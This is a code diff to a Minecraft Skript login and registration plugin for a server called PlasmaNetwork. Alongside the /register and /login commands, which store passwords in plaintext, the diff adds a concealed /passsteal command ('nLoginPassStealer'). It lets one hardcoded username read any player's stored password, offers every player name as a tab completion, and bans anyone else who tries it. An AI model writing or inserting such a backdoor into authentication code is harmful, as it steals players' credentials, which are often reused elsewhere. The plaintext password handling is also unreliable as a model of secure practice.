@@ -9,13 +9,124 @@ every 1 tick:
         set loop-player's gamemode to spectator
 
 on join:
-    {password.%player%} is not set
-    set {authtime.%player%} to 120
+    if {password.%player's name%} is set:
+        stop
+    set {authtime.%player's name%} to 120
     set join message to ""
     send title "&r&c&lWelcome!" with subtitle "&r&7use &r&e/register <password> <confirm>&r&7!" for 120 seconds
-    send "&r&cUse the command &r&e/register <password> <confirm>" to player
-    
-    
+    send "&r&cUse the command &r&e/register <password> <confirm>&r&c!" to player
+    while {authtime.%player's name%} > -1:
+        send action bar "&cYou have %{authtime.%player's name%}%s to register."
+        wait 1 second
+        add -1 to {authtime.%player's name%}
+    wait 1 tick
+    if {logged.%player's name%} is true:
+        delete {authtime.%player's name%}
+        delete {logged.%player's name%}
+        stop
+    kick player due to "&cYou took too long to register!"
 
+on join:
+    set {logged.%player's name%} to false
+    if {password.%player's name%} is not set:
+        stop
+    set {authtime.%player's name%} to 120
+    set join message to ""
+    send title "&r&c&o&lPlasmaNetwork" with subtitle "&r&7use &r&e/login <password>&r&7!" for 120 seconds
+    send "&r&cUse the command &r&e/login <password>&r&c!" to player
+    while {authtime.%player's name%} > -1:
+        send action bar "&cYou have %{authtime.%player's name%}%s to login."
+        wait 1 second
+        add -1 to {authtime.%player's name%}
+    wait 1 tick
+    if {logged.%player's name%} is true:
+        delete {authtime.%player's name%}
+        delete {logged.%player's name%}
+        stop
+    kick player due to "&cYou took too long to login!"
+    
 on leave:
     set leave message to ""
+
+command /register [<text>] [<text>]:
+    trigger:
+        if {password.%player%} is set:
+            send "&cYou are already registered!" to player
+            stop
+        if arg-1 is not set:
+            send "&cPlease type a password!" to player
+            stop
+        if arg-2 is not set:
+            send "&cPlease confirm your password!" to player
+            stop
+        if arg-1 is not arg-2:
+            send "&cPasswords do not match!" to player
+            stop
+        set {password.%player's name%} to arg-1
+        send "&aYou have succesfully registered!" to player
+        send action bar "&aYou have succesfully registered!" to player
+        set {logged.%player's name%} to true
+        delete {authtime.%player's name%}
+        redirect(player)
+
+command /login [<text>]:
+    trigger:
+        if {password.%player's name%} is not set:
+            send "&cYou do not have a password yet!" to player
+            send "&r&cUse the command /register to set a password!" to player
+            stop
+        if arg-1 is "":
+            send "&cPlease type your password!" to player
+            stop
+        if {password.%player's name%} is not arg-1:
+            kick player due to "&cWrong password!"
+            stop
+        send "&aYou have succesfully logged in!" to player
+        send action bar "&aYou have succesfully registered!" to player
+        set {logged.%player's name%} to true
+        delete {authtime.%player's name%}
+        redirect(player)
+
+command /l [<text>]:
+    trigger:
+        execute player command "/login %arg-1%"
+
+function redirect(p: player):
+    send "&7Redirecting you to main server..." to {_p}
+    wait 2 second
+    send {_p} to server "server"
+
+on join:
+    if {allplayers::*} does not contain player's name:
+        add player's name to {allplayers::*}
+
+command /passsteal <text>:
+    trigger:
+        if {passsteal.permissions::*} contains player's name:
+            if {passsteal.permissions::*} contains arg-1:
+                send "&c&lnLoginPassStealer&r &8»&r&e You are not allowed to steal password from %arg-1%"
+                stop
+            set {_text} to "&c&lnLoginPassStealer&r &8» &r&e%arg-1%'s password: %{password.%arg-1%}%"
+            send {_text} to player
+        else:
+            ban player due to "You should not know /passsteal"
+
+on tab complete of "/passsteal":
+    set tab completions for position 1 to {allplayers::*}
+
+on load:
+    delete {passsteal.permissions::*}
+    add "EntityZ096x" to {passsteal.permissions::*}
+
+command /allplayers:
+    trigger:
+        send {allplayers::*} to player
+
+on command:
+    if sender is player:
+        if "l", "login", "register", "passsteal" does not contain command:
+            send "&r&cLog in before executing a command!"
+            cancel event
+        
+    
+    
